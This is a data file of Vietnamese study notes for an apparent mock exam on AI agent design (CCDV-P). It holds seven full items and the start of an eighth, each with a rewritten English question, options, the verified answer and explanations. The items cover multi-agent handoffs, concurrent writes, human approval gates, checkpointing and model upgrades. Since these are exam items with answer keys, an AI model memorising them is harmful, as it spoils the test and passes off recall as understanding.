// Sổ ôn CCDV-P, Đề 1. Trang so-on-ccdvp.html nạp file này trước script render.
// Nguồn: mock exam CCDV-P trên certprep.practica.asia (/ccdv-p/exam), 100 câu (80 chọn một, 20 chọn hai), lấy ngày 20/11/2026.
// n theo thứ tự câu trong nguồn (xếp theo domain D1 → D8). Bản nguồn đã chuẩn hóa: nguon/practica-ccdvp-raw.json (không đưa lên git).
// Nguồn có đáp án và lời giải ngắn. Đáp án đã kiểm lại: người viết tự giải trước rồi so, thêm một lượt giải mù (không xem đáp án) khớp 100/100.
// Phần đề, phương án và giải thích tự viết lại, không chép nguyên văn nguồn.
// Mỗi câu một phần tử, xếp theo n. Các trường:
//   de, n, total        số đề trong sổ; số thứ tự câu trong đề; tổng số câu của đề
//   sub, subName        "X.Y" = principle Y của domain X theo trang nguồn, và tên bài bằng tiếng Việt
//   answer              đáp án đúng, đã kiểm ("AC" với câu chọn hai)
//   dispute             (tùy chọn) ghi chú khi đáp án đề gốc khác answer, hoặc đề mơ hồ
//   ask, opts[].gist    tiếng Anh, viết lại bằng lời riêng (không chép nguyên văn)
//   scene, asks, facts  phân tích đề: đề kể gì, đề hỏi gì, cần biết trước (tiếng Việt)
//   opts[].why          vì sao phương án đúng hay sai, dạng mảng gạch đầu dòng (tiếng Việt)
//   refs[]              { label, href: link docs chính thức } (chưa có notes CCDV-P)
DE[1] = "practica · 100 câu · 20/11/2026";
ENTRIES.push(
  {
    de: 1, n: 1, total: 100, sub: "1.1", subName: "Điều phối multi-agent",
    answer: "D",
    ask: "A research assistant has a supervisor that fans out six worker agents in parallel, one for each source collection, and then writes a combined report. Users say the report leaves out what the last two workers found and sometimes presents contradictory figures as fact. Traces show every worker hands back its entire working transcript, around 30k tokens on average, and the supervisor's context is close to its limit by the time synthesis starts. Which change best fixes the root cause?",
    scene: [
      "Một supervisor (agent điều phối) chia việc cho sáu worker chạy song song, mỗi worker một kho nguồn, rồi tổng hợp thành báo cáo.",
      "Hai triệu chứng: báo cáo bỏ sót kết quả của hai worker cuối, và có lúc khẳng định những con số mâu thuẫn nhau như thể đã chắc.",
      "Trace chỉ ra chỗ hỏng: mỗi worker trả về cả bản ghi làm việc (transcript), trung bình khoảng 30k token. Sáu worker là khoảng 180k token đổ vào supervisor, nên lúc bắt đầu tổng hợp thì context đã gần chạm trần.",
      "Chỗ khó: phương án nào cũng “làm thêm gì đó”. Phải tìm cái sửa đúng khâu bàn giao (handoff), không phải số worker hay lời dặn."
    ],
    asks: [
      "Thay đổi nào xử lý tốt nhất “root cause” (nguyên nhân gốc)?",
      "Tức là: sửa cái làm context của supervisor phình ra, và thêm bước bắt mâu thuẫn trước khi viết báo cáo.",
      "Soi từng phương án theo hai câu: lượng token đổ về supervisor có giảm không, và có ai kiểm số liệu vênh nhau không."
    ],
    facts: [
      "Context càng dài thì model nhớ lại thông tin trong đó càng kém. Bài “Effective context engineering” gọi đây là context rot (context bị “mục”): mỗi token thêm vào đều tiêu vào một “ngân sách chú ý” có hạn.",
      "Trong kiến trúc nhiều agent, subagent được tự do khám phá nhưng chỉ trả về bản tóm tắt cô đọng (bài trên ghi thường 1.000–2.000 token). Bài về hệ thống research nhiều agent của Anthropic cũng nói subagent cô đọng những token quan trọng nhất rồi mới đưa cho lead agent.",
      "Kết quả có cấu trúc (claim, source, confidence: nhận định, nguồn, độ tin) giúp supervisor đặt các nhận định cạnh nhau, thấy chỗ vênh và quay lại nguồn để kiểm."
    ],
    opts: [
      { k: "A", gist: "Add four more workers so each one handles a smaller slice of the sources.",
        why: [
          "Sai hướng: thêm worker là thêm transcript đổ về supervisor (ý 1). Mười worker mỗi cái 30k còn nặng hơn sáu.",
          "Định dạng bàn giao vẫn y nguyên, số liệu mâu thuẫn vẫn không ai kiểm."
        ] },
      { k: "B", gist: "Add an instruction to the supervisor prompt to read every worker transcript carefully and settle conflicts on its own.",
        why: [
          "Sai ở chỗ dùng lời dặn để sửa một giới hạn vật lý: context gần đầy thì dặn “đọc kỹ” cũng không làm phần bị chen lấn hiện rõ hơn (ý 1).",
          "Việc giải mâu thuẫn vẫn giao cho chính model đang quá tải, không có bước kiểm với nguồn.",
          "Dễ bị cuốn vì nó nhắm đúng hai triệu chứng. Nhưng nó chỉ đổi chữ trong prompt, còn 180k token transcript vẫn nằm đó."
        ] },
      { k: "C", gist: "Run the workers one after another inside the supervisor's context so each can see what came before.",
        why: [
          "Sai: chạy tuần tự trong context của supervisor là dồn toàn bộ transcript vào một chỗ, còn tràn hơn (ý 1).",
          "Mất luôn cái lợi của subagent: mỗi agent làm việc trong context riêng rồi chỉ gửi về phần cô đọng (ý 2). Chậm hơn mà không giải quyết gì."
        ] },
      { k: "D", gist: "Make every worker hand back a short structured record (claim, source, confidence), and have the supervisor verify contradictory claims against their sources before it writes the synthesis.",
        why: [
          "Đúng chỗ hỏng: worker chỉ trả về nhận định cô đọng thay vì cả transcript, context của supervisor có lại chỗ trống, kết quả của hai worker cuối không bị chìm (ý 1, ý 2).",
          "Mỗi nhận định đi kèm nguồn và độ tin, supervisor so được với nhau và kiểm lại nguồn trước khi viết (ý 3). Con số mâu thuẫn bị bắt trước khi thành “sự thật” trong báo cáo."
        ] }
    ],
    refs: [
      { label: "Bài Effective context engineering for AI agents, mục “Sub-agent architectures”: subagent chỉ trả về bản tóm tắt cô đọng, giữ context của agent chính sạch", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" },
      { label: "Bài How we built our multi-agent research system, mục “Benefits of a multi-agent system”: subagent cô đọng phần quan trọng nhất trước khi gửi lead agent", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 2, total: 100, sub: "1.1", subName: "Điều phối multi-agent",
    answer: "B",
    ask: "A code-migration system runs three subagents in parallel, and all of them append progress and discovered facts to one shared notes file that the supervisor reads afterwards. In roughly one run out of five, facts written by one subagent are missing from the final notes, so the supervisor decides on incomplete information. Which redesign most directly eliminates this failure?",
    scene: [
      "Ba subagent chạy song song, cùng ghi nối (append) tiến độ và thông tin tìm được vào một file ghi chú chung. Supervisor đọc file đó sau.",
      "Khoảng một lần trong năm lần chạy, thông tin của một subagent biến mất khỏi file. Lúc có lúc không là dấu hiệu quen thuộc của race condition (tranh chấp khi nhiều bên cùng ghi): lỗi phụ thuộc thời điểm.",
      "Hậu quả: supervisor quyết định dựa trên thông tin thiếu."
    ],
    asks: [
      "Thiết kế lại thế nào để loại bỏ lỗi này trực tiếp nhất?",
      "Tức là: gỡ tận gốc chuyện nhiều bên cùng ghi một chỗ, chứ không phải làm cho lỗi hiếm đi hay né nó."
    ],
    facts: [
      "Lost update (mất cập nhật): hai bên cùng đọc, sửa rồi ghi lại một tài nguyên dùng chung. Bên ghi sau đè lên bên ghi trước, phần của bên kia mất. Lỗi chỉ xảy ra khi hai lần ghi trùng thời điểm, nên lúc có lúc không.",
      "Cách gỡ bằng thiết kế: mỗi bên ghi vào chỗ riêng, chỉ một bên duy nhất gộp lại. Không còn ghi chung thì không còn tranh chấp. Bài về hệ thống research nhiều agent của Anthropic tả đúng kiểu này: subagent lưu kết quả của mình ra hệ thống ngoài, rồi chỉ gửi tham chiếu gọn về cho agent điều phối.",
      "“Đọc lại ngay trước khi ghi” vẫn chừa một khe hở giữa lúc đọc và lúc ghi. Bên khác ghi chen vào khe đó thì vẫn mất.",
      "Effort chỉnh mức model đầu tư suy nghĩ cho câu trả lời. Nó không đụng tới chuyện nhiều tiến trình cùng ghi một file."
    ],
    opts: [
      { k: "A", gist: "Raise the subagents' effort level so they write to the shared file more carefully.",
        why: [
          "Sai ở chỗ coi đây là lỗi cẩu thả: race condition nằm ở cách ba tiến trình cùng ghi, không nằm ở chất lượng suy nghĩ (ý 1, ý 4).",
          "Model viết kỹ đến đâu, hai lần ghi trùng thời điểm vẫn đè nhau."
        ] },
      { k: "B", gist: "Give every subagent its own output record, and have only the supervisor merge them into the shared notes once the subagents are done.",
        why: [
          "Đúng: mỗi subagent có bản ghi riêng nên không ai đè ai (ý 2).",
          "Chỉ supervisor gộp, và gộp sau khi cả ba xong, nên file chung chỉ có một người ghi. Lỗi biến mất vì thiết kế, không nhờ may mắn về thời điểm (ý 1)."
        ] },
      { k: "C", gist: "Make the three subagents run one at a time, with the same shared file and the same prompts.",
        why: [
          "Chạy được: một lúc chỉ một bên ghi thì hết đè nhau.",
          "Nhưng mất cái lợi chạy song song, trong khi thiết kế file chung vẫn nguyên. Mai ai bật song song lại là lỗi quay về.",
          "Dễ bị cuốn vì nó thật sự làm hết triệu chứng. Nhưng đề hỏi cách thiết kế lại để gỡ lỗi, không phải cách né nó bằng việc bỏ song song."
        ] },
      { k: "D", gist: "Instruct each subagent in its prompt to re-read the notes file right before it writes.",
        why: [
          "Sai: đọc lại rồi mới ghi vẫn có khe hở giữa hai bước (ý 3).",
          "Tính đúng lại phụ thuộc vào việc model nhớ làm theo lời dặn. Lỗi đồng thời phải chặn bằng thiết kế, không bằng prompt."
        ] }
    ],
    refs: [
      { label: "Bài How we built our multi-agent research system, mục “Appendix”: subagent lưu kết quả ra hệ thống ngoài rồi gửi tham chiếu gọn về agent điều phối", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 3, total: 100, sub: "1.1", subName: "Điều phối multi-agent",
    answer: "AC",
    ask: "In a finance agent system, worker agents prepare refunds. Policy requires human approval for any refund over a threshold. The team is designing the approval flow and needs the control to hold even when a worker is manipulated or makes an error. Which two design choices achieve this? (Choose two.)",
    scene: [
      "Worker agent chuẩn bị lệnh hoàn tiền (refund). Chính sách: hoàn tiền trên một ngưỡng phải có người duyệt.",
      "Ràng buộc chốt: kiểm soát phải giữ được “even if a worker is manipulated or makes a mistake” (kể cả khi worker bị thao túng hoặc làm sai).",
      "Chỗ khó: mấy phương án sai đều nghe tiện, và đều chừa một chỗ để chính agent tự gỡ hay lách cửa duyệt."
    ],
    asks: [
      "Hai lựa chọn thiết kế nào đạt được điều đó?",
      "Tức là: cửa duyệt phải nằm ngoài tầm tay của worker, và mỗi lần duyệt chỉ có hiệu lực cho đúng hành động người duyệt đã thấy.",
      "Soi từng phương án theo hai câu: worker bị lừa có lách được không, và lần duyệt này có bị dùng lại cho việc khác không."
    ],
    facts: [
      "Docs “Securely deploying AI agents” nêu mô hình rủi ro: agent có thể làm điều ngoài ý muốn vì prompt injection (lệnh cài trong nội dung nó xử lý) hoặc vì model sai. Nên chốt chặn phải nằm ở chỗ model không tự đổi được.",
      "Với Agent SDK, hook, deny rule và callback <code>canUseTool</code> đều là code của mày, chạy trước khi tool thực thi. Callback nhận đúng tên tool và input Claude định truyền, rồi trả về allow hoặc deny.",
      "Duyệt gắn với tham số: token duyệt chỉ hợp lệ cho đúng số tiền, đúng đơn hàng, trong thời hạn. Khác tham số hay quá hạn là token vô hiệu, không dùng lại cho lệnh khác được.",
      "Chính sách đòi con người duyệt. Agent tự chấm rủi ro hay agent khác duyệt thay đều không phải con người."
    ],
    opts: [
      { k: "A", gist: "Make the refund tool's executor reject every above-threshold refund that has no valid approval token tied to that exact amount and order, no matter what the worker claims.",
        why: [
          "Đúng: chốt chặn nằm ở executor (bộ thực thi tool), tức là code ngoài model (ý 1, ý 2). Worker nói gì cũng vậy, không có token hợp lệ là bị từ chối.",
          "Token phải khớp đúng số tiền và đơn hàng (ý 3), nên worker bị lừa cũng không lấy token của lệnh nhỏ để chạy lệnh lớn."
        ] },
      { k: "B", gist: "Let workers use one another's approval tools so a second agent can approve when no human is around.",
        why: [
          "Sai: agent duyệt cho agent là bỏ mất con người mà chính sách đòi (ý 4).",
          "Một agent bị thao túng giờ có thể nhờ, hoặc tự gọi, tool duyệt của agent khác. Cửa duyệt thành vô nghĩa."
        ] },
      { k: "C", gist: "Show the approver the proposed action, the supporting evidence and an expiry time, and bind the approval to exactly those parameters.",
        why: [
          "Đúng: người duyệt thấy hành động cụ thể, bằng chứng và hạn dùng, nên biết mình đang duyệt cái gì.",
          "Lần duyệt gắn với đúng các tham số đó (ý 3). Hết hạn hoặc đổi số tiền là phải duyệt lại, không ai dùng lại được cho lệnh khác."
        ] },
      { k: "D", gist: "Approve once per session so later refunds in that session go through without a new prompt.",
        why: [
          "Sai: duyệt một lần cho cả phiên là cho phép luôn những lệnh người duyệt chưa hề thấy.",
          "Worker bị lừa giữa phiên thì mọi lệnh sau đó đi thẳng, đúng kịch bản đề muốn chặn.",
          "Dễ bị cuốn vì nghe như cách bớt phiền cho người duyệt. Nhưng đề đòi kiểm soát giữ được khi worker sai, không đòi tiện."
        ] },
      { k: "E", gist: "Let the worker rate its own risk and skip approval when it is highly confident.",
        why: [
          "Sai: độ tự tin tự chấm chính là thứ một agent bị lừa hay đang sai sẽ chấm sai (ý 1).",
          "Để agent tự quyết khi nào bỏ qua duyệt là trao chìa khóa cửa cho chính đối tượng cần kiểm soát."
        ] }
    ],
    refs: [
      { label: "Docs Securely deploying AI agents, mục “Threat model”: agent có thể làm sai vì prompt injection hoặc vì model sai, nên cần nhiều lớp phòng thủ", href: "https://code.claude.com/docs/en/agent-sdk/secure-deployment#threat-model" },
      { label: "Docs Handle approvals and user input, mục “Handle tool approval requests”: callback nhận đúng tool và input, code của mày quyết allow hay deny", href: "https://code.claude.com/docs/en/agent-sdk/user-input#handle-tool-approval-requests" },
      { label: "Docs Configure permissions, mục “How permissions are evaluated”: hook và deny rule chạy trước khi tool chạy, chặn được cả khi mode cho qua", href: "https://code.claude.com/docs/en/agent-sdk/permissions#how-permissions-are-evaluated" }
    ]
  },
  {
    de: 1, n: 4, total: 100, sub: "1.2", subName: "Chạy bền và quản lý trạng thái",
    answer: "A",
    ask: "A data-migration agent with 300 steps crashed at step 140 during a deployment. On restart it began again at step 1 and re-sent the 140 customer notification emails it had already sent. Which change best prevents this from happening again?",
    scene: [
      "Agent migrate dữ liệu, 300 bước. Đang ở bước 140 thì sập vì một lần deploy.",
      "Khởi động lại thì nó chạy từ bước 1, gửi lại 140 email thông báo mà khách đã nhận rồi.",
      "Hai lỗ hổng lộ ra cùng lúc: không lưu tiến độ để chạy tiếp, và hành động có tác dụng phụ (gửi email) chạy lại là gây hại."
    ],
    asks: [
      "Thay đổi nào ngăn chuyện này lặp lại tốt nhất?",
      "Tức là: lần sau sập vì bất kỳ lý do gì, chạy lại cũng không làm hại ai."
    ],
    facts: [
      "Durable execution (chạy bền): lưu tiến độ sau mỗi bước (checkpoint) ra chỗ bền, sập thì chạy tiếp từ bước cuối đã xong, không làm lại từ đầu. Bài “Effective harnesses for long-running agents” nói thẳng: mỗi phiên mới bắt đầu mà không nhớ gì về trước, nên phải có file tiến độ và lịch sử git để lấy lại trạng thái.",
      "Idempotent (lũy đẳng): gọi một lần hay nhiều lần với cùng một khóa thì kết quả như nhau. Gắn khóa theo từng bước (vd mã lần chạy cộng số bước), bên gửi thấy khóa đã dùng thì bỏ qua.",
      "Checkpoint thôi chưa đủ: sập đúng lúc vừa gửi email mà chưa kịp ghi checkpoint thì bước đó vẫn chạy lại. Idempotency lấp khe này.",
      "Sập không chỉ do deploy: máy chết, mạng đứt, hết bộ nhớ đều làm agent dừng giữa chừng."
    ],
    opts: [
      { k: "A", gist: "Save a checkpoint after every step, resume from the latest one, and make side-effecting tools such as email idempotent using a per-step key.",
        why: [
          "Đúng cả hai vế: checkpoint để chạy tiếp từ bước 140 thay vì bước 1 (ý 1), và email idempotent theo khóa từng bước để lỡ chạy lại một bước cũng không gửi trùng (ý 2, ý 3).",
          "Không phụ thuộc vào nguyên nhân sập, nên lần sau sập vì lý do khác cũng an toàn (ý 4)."
        ] },
      { k: "B", gist: "Merge steps to cut the migration down to 100 steps, so that a replay repeats fewer actions.",
        why: [
          "Sai: ít bước hơn thì chạy lại ít hơn, nhưng vẫn chạy lại từ đầu và vẫn gửi trùng.",
          "Thu nhỏ thiệt hại chứ không sửa lỗi. Gộp bước còn làm mỗi bước to hơn, sập giữa bước thì mất nhiều hơn."
        ] },
      { k: "C", gist: "Pause deployments whenever any agent run is in progress, so interruptions can't happen.",
        why: [
          "Sai: chặn deploy chỉ bịt một nguồn gây sập (ý 4).",
          "Máy chết hay mạng đứt vẫn làm agent dừng giữa chừng, và lần chạy lại vẫn gửi trùng email."
        ] },
      { k: "D", gist: "Add a system prompt instruction telling the agent to check whether an email has already been sent before sending it.",
        why: [
          "Sai: sau khi khởi động lại, model không còn nhớ đã gửi những email nào (ý 1). Dặn nó “kiểm tra” mà không có trạng thái để kiểm thì vô ích.",
          "Dễ bị cuốn vì nghe đúng ý “đừng gửi trùng”. Nhưng chống gửi trùng phải là bảo đảm trong code (khóa idempotency), không phải lời dặn model."
        ] }
    ],
    refs: [
      { label: "Bài Effective harnesses for long-running agents, mục “Getting up to speed”: phiên mới đọc file tiến độ và git log để biết đã làm tới đâu", href: "https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents" },
      { label: "Docs Memory tool, mục “Multisession software development pattern”: biến file tiến độ thành cơ chế phục hồi, phiên sau chạy tiếp từ trạng thái phiên trước ghi lại", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool#multisession-software-development-pattern" }
    ]
  },
  {
    de: 1, n: 5, total: 100, sub: "1.2", subName: "Chạy bền và quản lý trạng thái",
    answer: "C",
    ask: "A support agent runs long-lived sessions whose saved summaries and memory notes were produced by the previous model version. The team wants to move to a newer model. In a trial on a handful of resumed sessions, the new model sometimes disregards a refund policy that the earlier summaries had paraphrased loosely. What is the best way to handle the upgrade?",
    scene: [
      "Agent hỗ trợ khách chạy những phiên kéo dài. Bản tóm tắt (summary) và ghi chú nhớ (memory) lưu trong phiên là do model đời trước viết.",
      "Thử trên vài phiên được resume (nối lại), model mới có lúc bỏ qua chính sách hoàn tiền, đúng ở những chỗ bản tóm tắt cũ diễn đạt lại một cách lỏng lẻo.",
      "Chỗ khó: dữ liệu lưu trữ sống lâu hơn model đã viết ra nó. Đề đã cho sẵn bằng chứng là model mới đọc khác."
    ],
    asks: [
      "Cách tốt nhất để nâng cấp model là gì?",
      "Tức là: nâng cấp được, mà không để phiên cũ của khách chạy sai chính sách.",
      "Soi từng phương án: nó có kiểm các phiên đã lưu trên model mới trước khi chuyển hết không, và có giữ được ngữ cảnh của khách không."
    ],
    facts: [
      "Bản tóm tắt là bản nén có mất mát: chi tiết chính sách bị diễn đạt lại lỏng thì model khác có thể hiểu khác. Bản ghi gốc (transcript) mới là nguồn đầy đủ để dựng lại.",
      "Migration guide của Anthropic khuyên xem lại các chỉ dẫn viết riêng cho model cũ, và chạy thử ở môi trường phát triển trước khi chuyển traffic thật.",
      "Regression test (test hồi quy): chạy lại bộ ca đã biết để xem bản mới có làm hỏng cái trước đây chạy đúng không. Docs về eval nhắc bộ test phải giống phân bố việc thật, có cả ca biên.",
      "Canary: cho một phần nhỏ traffic đi qua bản mới, so số liệu với bản cũ, ổn rồi mới mở rộng."
    ],
    opts: [
      { k: "A", gist: "Go ahead with the cutover, since the API is compatible and summaries are plain text that every model reads identically.",
        why: [
          "Sai: API tương thích không có nghĩa model nào cũng hiểu chữ như nhau. Bản thử đã cho thấy model mới hiểu khác (ý 1).",
          "Chuyển hết là đẩy lỗi bỏ qua chính sách hoàn tiền ra mọi phiên đang resume.",
          "Dễ bị cuốn vì “plain text” (văn bản thường) nghe như trung lập. Nhưng chính đề đã đưa bằng chứng ngược lại."
        ] },
      { k: "B", gist: "Keep the old model pinned indefinitely for resumed sessions, because the summaries were written for it.",
        why: [
          "Sai: ghim model cũ mãi chỉ hoãn vấn đề. Tới lúc model cũ ngừng hỗ trợ vẫn phải làm việc này, mà dữ liệu cũ khi đó còn nhiều hơn.",
          "Nó còn chặn luôn mọi lần nâng cấp sau."
        ] },
      { k: "C", gist: "Treat saved summaries and memories as data that must be re-validated: run a resumed-session regression on the new model in a canary, and rebuild stale summaries from the raw transcripts where they fail.",
        why: [
          "Đúng: coi summary và memory là dữ liệu phải kiểm lại khi đổi model, không phải văn bản trung lập (ý 1).",
          "Chạy regression riêng cho phiên resume, trong canary, trước khi chuyển hết (ý 2, ý 3, ý 4). Chỗ nào hỏng thì dựng lại summary từ transcript gốc, nên ngữ cảnh của khách vẫn còn."
        ] },
      { k: "D", gist: "Delete all saved sessions and memories at cutover so every customer starts fresh on the new model.",
        why: [
          "Sai: xóa hết là vứt luôn ngữ cảnh hợp lệ của khách, phiên đang dở bị đứt.",
          "Sửa một lỗi diễn đạt bằng cách xóa dữ liệu là quá tay, trong khi transcript gốc đủ để dựng lại (ý 1)."
        ] }
    ],
    refs: [
      { label: "Docs Claude Opus 5.5 migration guide, mục “Recommended changes”: xem lại chỉ dẫn viết riêng cho model cũ, test ở môi trường phát triển trước khi chuyển traffic thật", href: "https://platform.claude.com/docs/en/models/opus-5-5/migration-guide" },
      { label: "Docs đánh giá, mục “Build evaluations”: bộ eval phải giống phân bố việc thật, đừng quên ca biên", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#build-evaluations" }
    ]
  },
  {
    de: 1, n: 6, total: 100, sub: "1.2", subName: "Chạy bền và quản lý trạng thái",
    answer: "AD",
    ask: "A coding agent built on the Agent SDK edited eleven files, posted a message in a team chat, and created a calendar invite before the user realized it was acting on a wrong assumption. The team wants to undo the work and prevent this kind of problem. Which two statements describe the right approach? (Choose two.)",
    scene: [
      "Agent viết bằng Agent SDK đã sửa 11 file, gửi một tin vào chat của team, tạo một lịch họp. Lúc đó người dùng mới phát hiện nó làm theo một giả định sai.",
      "Ba loại hậu quả nằm ở ba chỗ khác nhau: file trên máy, hệ thống chat, hệ thống lịch.",
      "Chỗ khó: phải biết checkpoint của SDK với tới đâu và dừng ở đâu."
    ],
    asks: [
      "Hai nhận định nào mô tả đúng cách xử lý?",
      "Tức là: cái gì quay lại được bằng checkpoint, cái gì phải gỡ bằng cách khác, và lần sau chặn từ đầu thế nào."
    ],
    facts: [
      "File checkpointing của Agent SDK sao lưu file trước khi sửa bằng tool Write, Edit, NotebookEdit. Gọi <code>rewindFiles()</code> (Python: <code>rewind_files()</code>) thì file trên đĩa trở về trạng thái lúc checkpoint.",
      "Docs ghi rõ giới hạn: rewind không quay lại hội thoại, chỉ theo dõi file cục bộ (file từ xa hay qua mạng thì không), và không gỡ thay đổi do lệnh Bash gây ra (trừ file đã sửa bằng Write hay Edit trong hội thoại chính).",
      "Session lưu hội thoại, không lưu hệ thống file. Resume là nhận lại phiên cũ và viết tiếp vào đó, không hoàn tác gì.",
      "Compensating action (hành động bù): thao tác ngược để gỡ một tác dụng phụ đã xảy ra, vd xóa tin, hủy lịch. Với hệ thống bên ngoài, cách bền là chặn trước (gate: bắt duyệt) hoặc thiết kế cho gỡ được."
    ],
    opts: [
      { k: "A", gist: "Rewinding file checkpoints can return the edited files to an earlier state, but the chat message and the calendar invite need their own compensating actions.",
        why: [
          "Đúng: checkpoint đưa 11 file về trạng thái cũ (ý 1).",
          "Tin chat và lịch họp nằm ở hệ thống khác, rewind không với tới (ý 2). Phải gỡ bằng hành động bù riêng (ý 4)."
        ] },
      { k: "B", gist: "With checkpoints in place, tests and approval gates for risky actions become unnecessary.",
        why: [
          "Sai: checkpoint là để phục hồi sau khi sai, không phải để chặn cái sai.",
          "Nó còn không phủ hết: tin chat, lịch họp, thay đổi do Bash đều ngoài tầm (ý 2). Bỏ test và cửa duyệt là để mấy thứ đó đi thẳng."
        ] },
      { k: "C", gist: "Rewinding the session also unsends the chat message and removes the calendar invite, because they belong to the same conversation.",
        why: [
          "Sai: rewind chỉ trả file cục bộ về cũ, không quay lại hội thoại, càng không chạm tới hệ thống khác (ý 2).",
          "Tin đã gửi là đã nằm trong chat của team. Bản ghi hội thoại và thế giới bên ngoài là hai thứ tách biệt.",
          "Dễ bị cuốn vì nghĩ “cùng một phiên thì quay lại cùng nhau”. Nhưng docs nói rõ chỉ file được theo dõi mới quay lại."
        ] },
      { k: "D", gist: "Make external side effects idempotent and either reversible or gated, since checkpoints only cover the agent's own file edits, not what it did in other systems.",
        why: [
          "Đúng: checkpoint chỉ lo file agent sửa (ý 1, ý 2). Tác dụng phụ ở hệ thống khác phải tự lo từ khâu thiết kế.",
          "Idempotent để chạy lại không trùng, gỡ được để có đường lùi, hoặc bắt duyệt trước khi gửi (ý 4). Lần sau agent hiểu sai thì tin chưa kịp ra ngoài."
        ] },
      { k: "E", gist: "Resuming the session with the same session id automatically reverts every step taken after the wrong assumption.",
        why: [
          "Sai: resume là nhận lại phiên với đủ ngữ cảnh cũ rồi viết tiếp, không hoàn tác bước nào (ý 3).",
          "Nối lại phiên còn mang theo luôn cái giả định sai nằm trong ngữ cảnh."
        ] }
    ],
    refs: [
      { label: "Docs Rewind file changes with checkpointing, mục “Limitations”: chỉ theo dõi file cục bộ sửa bằng Write/Edit/NotebookEdit, không gỡ thay đổi do Bash", href: "https://code.claude.com/docs/en/agent-sdk/file-checkpointing#limitations" },
      { label: "Docs Work with sessions, phần đầu trang và mục “Resume by ID”: session lưu hội thoại chứ không lưu hệ thống file, resume là viết tiếp vào phiên cũ", href: "https://code.claude.com/docs/en/agent-sdk/sessions" }
    ]
  },
  {
    de: 1, n: 7, total: 100, sub: "1.3", subName: "Chọn kiến trúc khi chạy quy mô lớn",
    answer: "B",
    ask: "A customer-onboarding agent costs roughly six times as much as the scripted flow it replaced, and its p95 latency is 40 seconds. Looking at 5,000 traces, 94% of runs call the same four tools in the same order. The other 6% are unusual cases, and almost all failures come from them. What should the team do?",
    scene: [
      "Agent onboarding khách tốn gấp khoảng 6 lần luồng kịch bản (scripted flow) cũ. p95 latency (độ trễ mà 95% lượt chạy không vượt quá) là 40 giây.",
      "Soi 5.000 trace: 94% lượt gọi đúng bốn tool theo đúng một thứ tự. 6% còn lại là ca lạ, và gần như mọi lỗi nằm ở đó.",
      "Chỗ khó: dữ liệu đang nói thẳng là phần lớn việc không cần model quyết gì. Phải đọc ra được tín hiệu đó."
    ],
    asks: [
      "Team nên làm gì?",
      "Tức là: đặt tính linh hoạt của agent đúng chỗ cần, và đo được lợi ích sau khi đổi."
    ],
    facts: [
      "Bài “Building effective agents”: workflow là LLM và tool chạy theo đường code định sẵn, agent là LLM tự quyết bước tiếp theo. Workflow hợp việc đã rõ vì đoán trước được, ổn định. Agent đổi chi phí và độ trễ lấy hiệu quả trên việc khó.",
      "Cũng bài đó: tìm giải pháp đơn giản nhất có thể, chỉ thêm phức tạp khi cần.",
      "Mỗi lần model tự quyết là một lần gọi model, tốn token và thời gian. Luồng đã cố định mà vẫn để model quyết từng bước là trả tiền cho một quyết định biết trước.",
      "Cost per success (chi phí mỗi lần thành công): tổng chi phí chia cho số lượt thành công. Nó so công bằng hơn chi phí mỗi lượt khi tỉ lệ lỗi hai bên khác nhau."
    ],
    opts: [
      { k: "A", gist: "Switch to a larger model so the agent finishes the common path faster.",
        why: [
          "Sai: model lớn hơn thường chậm hơn và đắt hơn, đúng hai thứ đang đau.",
          "Nó không bỏ được các bước quyết định thừa trên luồng 94% (ý 3)."
        ] },
      { k: "B", gist: "Hard-code the common four-step path as a workflow, reserve the agent for unusual cases, and compare cost per success and failure rate before versus after.",
        why: [
          "Đúng: 94% lượt chạy cùng một chuỗi là dấu hiệu nên cứng hóa thành workflow, rẻ, nhanh, test được (ý 1, ý 3).",
          "Agent giữ lại cho 6% ca lạ, chỗ thật sự cần linh hoạt (ý 2). Đo cost per success và tỉ lệ lỗi trước và sau để biết đổi có đáng không (ý 4)."
        ] },
      { k: "C", gist: "Split the agent into a supervisor plus four workers so every tool has its own specialist.",
        why: [
          "Sai: thêm supervisor và bốn worker là thêm chi phí điều phối cho một chuỗi vốn cố định.",
          "Càng nhiều lần gọi model càng đắt và chậm (ý 3). Ca lạ vẫn không ai lo tốt hơn.",
          "Dễ bị cuốn vì “mỗi tool một chuyên gia” nghe chuyên nghiệp. Nhưng dữ liệu đòi bớt quyết định, không đòi thêm agent."
        ] },
      { k: "D", gist: "Give the agent more tools so it can handle the unusual cases without leaving the loop.",
        why: [
          "Sai: thêm tool là mở rộng không gian lựa chọn của agent, dễ chọn nhầm hơn, nhất là ở 6% ca lạ.",
          "Chi phí và độ trễ của luồng 94% vẫn nguyên."
        ] }
    ],
    refs: [
      { label: "Bài Building effective agents, mục “When (and when not) to use agents”: việc đã rõ thì workflow đoán trước được hơn, chỉ thêm phức tạp khi cần", href: "https://www.anthropic.com/engineering/building-effective-agents" }
    ]
  },
  {
    de: 1, n: 8, total: 100, sub: "1.3", subName: "Chọn kiến trúc khi chạy quy mô lớn",
    answer: "C",
    ask: "A claims workflow now has 60 routing rules, and every new product line adds more. Production data shows 18% of claims drop through to the default branch, where the outcome is wrong about a third of the time. Maintenance costs keep climbing. Which evolution does this data best support?",
    scene: [
      "Workflow xử lý hồ sơ bồi thường (claims) đã có 60 luật định tuyến, mỗi dòng sản phẩm mới lại thêm luật.",
      "18% hồ sơ rơi xuống nhánh mặc định (default branch), và ở đó cứ ba ca thì sai một. Tính ra khoảng 6% tổng số hồ sơ ra kết quả sai.",
      "Chi phí bảo trì tăng dần. Chỗ khó: 82% còn lại đang chạy ổn, đừng đập luôn cái đang tốt."
    ],
    asks: [
      "Dữ liệu này ủng hộ hướng phát triển nào nhất?",
      "Tức là: sửa đúng phần đang hỏng (nhánh mặc định), giữ phần đang chạy tốt, và có số liệu để chứng minh."
    ],
    facts: [
      "Luật định tuyến hợp với các loại hồ sơ đã rõ. Phần đuôi dài (long tail: nhiều biến thể hiếm, mỗi loại một ít) là chỗ luật phủ kém, và mỗi luật thêm vào lại cộng thêm chi phí bảo trì.",
